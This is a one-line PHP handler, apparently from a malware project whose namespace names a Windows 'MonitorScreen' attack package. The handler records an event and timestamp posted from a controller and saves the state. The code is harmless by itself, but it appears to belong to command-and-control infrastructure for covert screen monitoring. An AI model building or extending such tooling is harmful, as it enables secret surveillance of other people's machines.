<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen\MonitorScreen $this */

$this->updateEventFromController($this->requestData->postCheck("event"), $this->requestData->postCheck("unixTime"))->saveState();
